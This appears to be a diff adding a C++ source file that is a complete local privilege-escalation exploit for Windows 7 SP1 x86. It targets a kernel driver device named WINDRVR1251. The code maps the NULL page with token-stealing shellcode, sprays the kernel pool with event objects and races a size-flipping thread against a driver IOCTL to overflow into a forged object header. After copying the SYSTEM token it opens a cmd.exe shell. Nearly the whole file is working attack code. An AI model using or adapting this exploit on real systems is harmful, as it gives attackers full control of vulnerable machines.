@@ -1,0 +1,322 @@
+// ConsoleApplication1.cpp : Defines the entry point for the console application.
+//
+
+#include "stdafx.h"
+#include <Windows.h>
+#include <winioctl.h>
+
+#define device L"\\\\.\\WINDRVR1251"
+#define SPRAY_SIZE 30000
+
+typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID *BaseAddress,
+    ULONG ZeroBits,
+    PULONG AllocationSize,
+    ULONG AllocationType,
+    ULONG Protect
+    );
+
+// Windows 7 SP1 x86 Offsets
+#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
+#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
+#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
+#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
+#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
+#define SYSTEM_PID        0x004    // SYSTEM Process PID
+/*
+* The caller expects to call a cdecl function with 4 (0x10 bytes) arguments.
+*/
+__declspec(naked) VOID TokenStealingShellcode() {
+    __asm {
+       hasRun:
+             xor eax, eax; Set zero
+             cmp byte ptr [eax], 1; If this is 1, we have already run this code
+             jz End;
+             mov byte ptr [eax], 1; Indicate that this code has been hit already
+
+            ; initialize
+            mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
+            mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process
+
+            mov ecx, eax; Copy current _EPROCESS structure
+
+            mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token
+            mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4
+
+            ; begin system token search loop
+            SearchSystemPID :
+        mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
+            sub eax, FLINK_OFFSET
+            cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
+            jne SearchSystemPID
+
+            mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
+            mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM to current process
+
+            End :
+        ret 0x10; cleanup for cdecl
+
+    }
+}
+
+BOOL map_null_page()
+{
+    /* Begin NULL page map */
+    HMODULE hmodule = LoadLibraryA("ntdll.dll");
+    if (hmodule == INVALID_HANDLE_VALUE)
+    {
+        printf("[x] Couldn't get handle to ntdll.dll\n");
+        return FALSE;
+    }
+    PNtAllocateVirtualMemory AllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(hmodule, "NtAllocateVirtualMemory");
+    if (AllocateVirtualMemory == NULL)
+    {
+        printf("[x] Couldn't get address of NtAllocateVirtualMemory\n");
+        return FALSE;
+    }
+
+    SIZE_T size = 0x1000;
+    PVOID address = (PVOID)0x1;
+    NTSTATUS allocStatus = AllocateVirtualMemory(GetCurrentProcess(),
+        &address,
+        0,
+        &size,
+        MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
+        PAGE_EXECUTE_READWRITE);
+
+    if (allocStatus != 0)
+    {
+        printf("[x] Error mapping null page\n");
+        return FALSE;
+    }
+    
+    printf("[+] Mapped null page\n");
+    return TRUE;
+}
+
+/*
+* Continually flip the size
+* @Param user_size - a pointer to the user defined size
+*/
+DWORD WINAPI flip_thread(LPVOID user_size)
+{
+    printf("[+] Flipping thread started\n");
+    while (TRUE)
+    {
+        *(ULONG *)(user_size) ^= 10; //flip between 0x52 and 0x58, giving a 0x40 byte overflow.
+    }
+    return 0;
+}
+
+DWORD WINAPI ioctl_thread(LPVOID user_buff)
+{
+    char out_buff[40];
+    DWORD bytes_returned;
+    
+    HANDLE hdevice = CreateFile(device,
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        0
+    );
+
+    
+    if (hdevice == INVALID_HANDLE_VALUE)
+    {
+        printf("[x] Couldn't open device\n");
+    }
+
+    NTSTATUS ret = DeviceIoControl(hdevice,
+        0x95382623,
+        user_buff,
+        0x1000,
+        out_buff,
+        40,
+        &bytes_returned,
+        0);
+    
+    CloseHandle(hdevice);
+    return 0;
+}
+
+void spray_pool(HANDLE handle_arr[])
+{
+    //create SPRAY_SIZE event objects filling up the pool
+    for (int i = 0; i < SPRAY_SIZE; i++)
+    {
+        handle_arr[i] = CreateEvent(NULL, 0, NULL, L"");
+    }
+
+    for (int i = 0; i < SPRAY_SIZE; i+=50)
+    {
+        for (int j = 0; j < 14 && j + i < SPRAY_SIZE; j++)
+        {
+            CloseHandle(handle_arr[j + i]);
+            handle_arr[j + i] = 0;
+        }
+    }
+}
+
+void free_events(HANDLE handle_arr[])
+{
+    for (int i = 0; i < SPRAY_SIZE; i++)
+    {
+        if (handle_arr[i] != 0)
+        {
+            CloseHandle(handle_arr[i]);
+        }
+    }
+}
+
+BOOL check_priv_count(DWORD old_count, PDWORD updated_count)
+{
+    HANDLE htoken;
+    DWORD length;
+    DWORD temp;
+    DWORD new_count;
+    PTOKEN_PRIVILEGES current_priv = NULL;
+
+    if (!OpenProcessToken(GetCurrentProcess(), GENERIC_READ, &htoken))
+    {
+        printf("[x] Couldn't get current token\n");
+        return FALSE;
+    }
+
+    //get the size required for the current_priv allocation
+    GetTokenInformation(htoken, TokenPrivileges, current_priv, 0, &length);
+
+    //allocate memory for the structure
+    current_priv = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, length);
+
+    //get the actual token info
+    GetTokenInformation(htoken, TokenPrivileges, current_priv, length, &length);
+    new_count = current_priv->PrivilegeCount;
+
+    HeapFree(GetProcessHeap(), 0, current_priv);
+    CloseHandle(htoken);
+
+    temp = old_count;       //store the old count
+    *updated_count = new_count; //update the count 
+    if (new_count > old_count)
+    {
+        printf("[+] We now have %d privileges\n", new_count);
+        return TRUE;
+    }
+    else
+        return FALSE;
+}
+
+int main()
+{
+    HANDLE h_flip_thread;
+    HANDLE h_ioctl_thread;
+    HANDLE handle_arr[SPRAY_SIZE] = { 0 };
+    DWORD mask = 0;
+    DWORD orig_priv_count = 0;
+    char *user_buff;
+    
+    check_priv_count(-1, &orig_priv_count);
+    printf("[+] Original priv count: %d\n", orig_priv_count);
+
+    if (!map_null_page())
+    {
+        return -1;
+    }
+
+    *(ULONG *)0x74 = (ULONG)&TokenStealingShellcode;
+
+    user_buff = (char *)VirtualAlloc(NULL,
+        0x1000,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_NOCACHE | PAGE_READWRITE);
+
+    if (user_buff == NULL)
+    {
+        printf("[x] Couldn't allocate memory for buffer\n");
+        return -1;
+    }
+    memset(user_buff, 0x41, 0x1000);
+
+    *(ULONG *)(user_buff + 0x34) = 0x00000052; //set the size initially to 0x51
+
+    //pool header block
+    *(ULONG *)(user_buff + 0x374) = 0x04080070; //ULONG1
+    *(ULONG *)(user_buff + 0x378) = 0xee657645;//PoolTag
+
+    //QuotaInfo block
+    *(ULONG *)(user_buff + 0x37c) = 0x00000000; //PagedPoolCharge
+    *(ULONG *)(user_buff + 0x380) = 0x00000040; //NonPagedPoolCharge
+    *(ULONG *)(user_buff + 0x384) = 0x00000000; //SecurityDescriptorCharge
+    *(ULONG *)(user_buff + 0x388) = 0x00000000; //SecurityDescriptorQuotaBlock
+
+    //Event header block
+    *(ULONG *)(user_buff + 0x38c) = 0x00000001; //PointerCount
+    *(ULONG *)(user_buff + 0x390) = 0x00000001; //HandleCount
+    *(ULONG *)(user_buff + 0x394) = 0x00000000; //NextToFree
+    *(ULONG *)(user_buff + 0x398) = 0x00080000; //TypeIndex <--- NULL POINTER
+    *(ULONG *)(user_buff + 0x39c) = 0x867b3940; //objecteCreateInfo
+    *(ULONG *)(user_buff + 0x400) = 0x00000000;
+    *(ULONG *)(user_buff + 0x404) = 0x867b3940; //QuotaBlockCharged
+
+
+
+    /*
+    * create a suspended thread for flipping, passing in a pointer to the size at user_buff+0x34
+    * Set its priority to highest.
+    * Set its mask so that it runs on a particular core.
+    */
+    h_flip_thread = CreateThread(NULL, 0, flip_thread, user_buff + 0x34, CREATE_SUSPENDED, 0);
+    SetThreadPriority(h_flip_thread, THREAD_PRIORITY_HIGHEST);
+    SetThreadAffinityMask(h_flip_thread, 0);
+    ResumeThread(h_flip_thread);
+    printf("[+] Starting race...\n");
+
+    spray_pool(handle_arr);
+
+    while (TRUE)
+    {
+        h_ioctl_thread = CreateThread(NULL, 0, ioctl_thread, user_buff, CREATE_SUSPENDED, 0);
+        SetThreadPriority(h_ioctl_thread, THREAD_PRIORITY_HIGHEST);
+        SetThreadAffinityMask(h_ioctl_thread, 1);
+        
+        ResumeThread(h_ioctl_thread);
+        
+        WaitForSingleObject(h_ioctl_thread, INFINITE);
+
+        free_events(handle_arr); //free the event objects 
+
+        if (check_priv_count(orig_priv_count, &orig_priv_count))
+        {
+            printf("[+] Breaking out of loop, popping shell!\n");
+            break;
+        }
+        //pool header block
+        *(ULONG *)(user_buff + 0x374) = 0x04080070; //ULONG1
+        *(ULONG *)(user_buff + 0x378) = 0xee657645;//PoolTag
+
+                                                   //QuotaInfo block
+        *(ULONG *)(user_buff + 0x37c) = 0x00000000; //PagedPoolCharge
+        *(ULONG *)(user_buff + 0x380) = 0x00000040; //NonPagedPoolCharge
+        *(ULONG *)(user_buff + 0x384) = 0x00000000; //SecurityDescriptorCharge
+        *(ULONG *)(user_buff + 0x388) = 0x00000000; //SecurityDescriptorQuotaBlock
+
+                                                    //Event header block
+        *(ULONG *)(user_buff + 0x38c) = 0x00000001; //PointerCount
+        *(ULONG *)(user_buff + 0x390) = 0x00000001; //HandleCount
+        *(ULONG *)(user_buff + 0x394) = 0x00000000; //NextToFree
+        *(ULONG *)(user_buff + 0x398) = 0x00080000; //TypeIndex <--- NULL POINTER
+        *(ULONG *)(user_buff + 0x39c) = 0x867b3940; //objecteCreateInfo
+        *(ULONG *)(user_buff + 0x400) = 0x00000000;
+        *(ULONG *)(user_buff + 0x404) = 0x867b3940; //QuotaBlockCharged
+
+        
+        spray_pool(handle_arr);
+    }
+
+    system("cmd.exe");
+
+    return 0;
+}
